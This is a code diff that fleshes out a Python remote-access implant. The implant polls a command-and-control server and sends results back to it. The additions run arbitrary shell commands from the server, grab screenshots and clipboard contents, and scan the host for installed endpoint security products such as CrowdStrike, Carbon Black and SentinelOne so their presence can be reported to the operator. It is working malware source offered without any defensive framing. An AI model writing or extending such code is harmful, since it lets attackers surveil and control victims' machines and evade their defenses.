@@ -1,10 +1,13 @@
 import time
+import pyperclip
 import requests
 import json
 import subprocess
 import random
 import urllib3
 import os
+from PIL import ImageGrab
+import io
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -24,7 +27,7 @@ def send_output(endpoint:str,data):
     try:
         requests.post(C2_SERVER_URL+endpoint,verify=False,headers=HEADERS,data=data)
     except Exception as e:
-        pass
+        print(e)
 def check_in():
     """Send a Check-In GET request to the server."""
     try:
@@ -41,7 +44,13 @@ def check_in():
     return []
 
 def handle_exit(command):
-    print("Exiting the program...")
+    output = "Exiting the session. Goodbye!"
+    
+    # Send the output back to the server (if applicable)
+    send_output(endpoint='/exit',data=output)
+    
+    # Exit the program
+    exit(0)
 
 def handle_pwd(command):
     pwd = subprocess.run("pwd",shell=True,text=True,capture_output=True)
@@ -72,7 +81,32 @@ def handle_connections(command):
     send_output(endpoint="/connections",data=data)
 
 def handle_cd(command):
-    print("Handling cd command...")
+    output = ""
+    
+    try:
+        # Extract the target directory from the command
+        target_dir = command.strip().split(maxsplit=1)[1]
+        
+        # Change the directory
+        os.chdir(target_dir)
+        
+        # Get the new current directory
+        output = f"Changed directory to: {os.getcwd()}"
+    except IndexError:
+        # Handle case where no directory is specified
+        output = "Error: No directory specified."
+    except FileNotFoundError:
+        # Handle case where the directory does not exist
+        output = f"Error: Directory not found: {target_dir}"
+    except PermissionError:
+        # Handle case where there is a permission issue
+        output = f"Error: Permission denied: {target_dir}"
+    except Exception as e:
+        # Handle any other unforeseen errors
+        output = f"Error: {str(e)}"
+    
+    # Send the output back to the server
+    send_output(endpoint='/cdfile',data=output)
 
 def handle_addresses(command):
     addresses = subprocess.run("ip addr",shell=True,text=True,capture_output=True)
@@ -91,10 +125,66 @@ def handle_userhist(command):
     send_output(endpoint="/userhist",data=data)
 
 def handle_screenshot(command):
-    print("Handling screenshot command...")
+    output = ""
+
+    try:
+        # Capture the screenshot
+        screenshot = ImageGrab.grab()
+
+        # Save the screenshot to a buffer in PNG format
+        buffer = io.BytesIO()
+        screenshot.save(buffer, format="PNG")
+        buffer.seek(0)
+
+        # You can send the buffer content to the server or save it as a file
+        # Save locally as an example
+        screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
+        with open(screenshot_path, "wb") as f:
+            f.write(buffer.read())
+
+        output = buffer.read()
+    except Exception as e:
+        # Handle errors gracefully
+        output = f"Error taking screenshot: {str(e)}"
+
+    # Send the result or error message back to the server
+    HEADERS["Content-Type"] = "image/png"
+    send_output(endpoint='/screenshot',data=output)
 
 def handle_checksecurity(command):
-    print("Handling download command...")
+    # List of keywords to identify EDR products
+    edr_keywords = [
+        "CbOsxSensorService", "CbDefense", "xagt", "falconctl", "ESET",
+        "Littlesnitch", "sentinel", "globalprotect", "paloalto", "fireeye",
+        "carbonblack", "mcafee", "symantec", "trendmicro", "kaspersky",
+        "sophos", "bitdefender", "opendns", "zscaler"
+    ]
+
+    # Commands to search in various areas
+    detection_methods = {
+        "Processes": ["ps", "aux"],
+        "Installed Packages": ["dpkg", "-l"],
+        "Services": ["systemctl", "list-units"],
+        "Drivers": ["lsmod"],
+        "Network Connections": ["netstat", "-antp"]
+    }
+
+    detected_edrs = set()
+
+    for category, command in detection_methods.items():
+        try:
+            output = subprocess.check_output(command, universal_newlines=True)
+            for keyword in edr_keywords:
+                if keyword.lower() in output.lower():
+                    detected_edrs.add(keyword)
+        except Exception as e:
+            pass
+
+    # send detected EDR products
+    edrs = ""
+    for edr in detected_edrs:
+        edrs += f"- {edr}\n"
+    send_output(endpoint='/checksecurity',data=edrs.encode())
 
 def handle_download(command):
     """Process the download command by reading a file and sending it to the server."""
@@ -134,14 +224,78 @@ def handle_systeminfo(command):
     data = f"\033[35mSystem info:\033[0m \n{sys_info} \n\033[35mCPU Info:\033[0m \n{cpu_info} \n\033[35mMemory Info:\033[0m \n{memory_info} \n\033[35mDisk Info:\033[0m \n{disk_info} \n\033[35mNetwork Info:\033[0m \n{net_info} \n\033[35mGPU Info:\033[0m \n{gpu_info}".encode()
     send_output(endpoint='/sysinfo',data=data)
 
-def handle_clipboard():
+def handle_clipboard(command):
     print("Handling clipboard command...")
+    try:
+        # Get clipboard content
+        clipboard_content = pyperclip.paste()  # For pyperclip, use pyperclip.paste()
+        
+        if not clipboard_content.strip():
+            clipboard_content = "Error: Clipboard is empty or contains non-text data."
+        
+    except Exception as e:
+        clipboard_content = f"Error: {e}"
 
-def handle_shell():
-    print("Handling shell command...")
+    # Send clipboard content to the server
+    response = send_output(endpoint='/clipboard',data=clipboard_content.encode())
 
-def handle_sleep():
-    print("Handling sleep command..")
+def handle_shell(command):
+    output = ""
+
+    # Check if command starts with "shell"
+    if command.startswith("shell "):
+        # Extract the actual command by stripping "shell " from the start
+        shell_command = command[6:].strip()
+        
+        try:
+            if shell_command.strip() == "":
+                output = "Error: Command not found"
+                print(output)
+            else:
+                print
+                # Run the shell command
+                result = subprocess.run(shell_command, shell=True, capture_output=True, text=True)
+                
+                # Check if the command was successful (returncode == 0)
+                if result.returncode == 0:
+                    # If successful, return the output
+                    output = f"[+] Command output:\033[0m\n{result.stdout.strip()}" if result.stdout.strip() else "Command executed successfully with no output."
+                else:
+                    # If there's an error, capture the error message
+                    output = f"Error executing command: {result.stderr.strip()}"
+        
+        except Exception as e:
+            # In case of exception, capture it in the error message
+            output = f"Error: {str(e)}"
+    # Send the response back to the server
+    print(output)
+    send_output(endpoint='/shell',data=output.encode())
+
+def handle_sleep(command):
+    message = ""  # Variable to store the response message
+    try:
+        # Check for the correct format
+        # Extract the sleep duration
+        duration_str = command.split(" ")[1]
+        # Convert duration to a float
+        try:
+            duration = float(duration_str)
+            # Validate the duration
+            if duration <= 0:
+                message = "ERROR_NON_POSITIVE_DURATION"
+            else:
+                # Perform sleep
+                SLEEP_INTERVAL = duration
+                message = f"[+] Successfully slept for {duration} seconds."
+                print(message)
+        except ValueError:
+            message = "ERROR_INVALID_DURATION"
+
+    except Exception as e:
+        message = f"Error: during sleep: {e}"
+
+    # Send the response back to the server
+    send_output(endpoint='/sleep',data=message.encode())
 
 # Create a switch-like dictionary
 commands_switch = {
@@ -163,14 +317,14 @@ commands_switch = {
     "prompt": handle_prompt,
     "systeminfo": handle_systeminfo,
     "clipboard": handle_clipboard,
-    "shell ": handle_shell,
-    "sleep ": handle_sleep,
+    "shell": handle_shell,
+    "sleep": handle_sleep,
 }
 
 def handle_command(command):
     # Get the corresponding function for the command
     action = commands_switch.get(command.split(" ")[0], None)
-
+    print
     if action:
         action(command)  # Execute the command's function
     else:
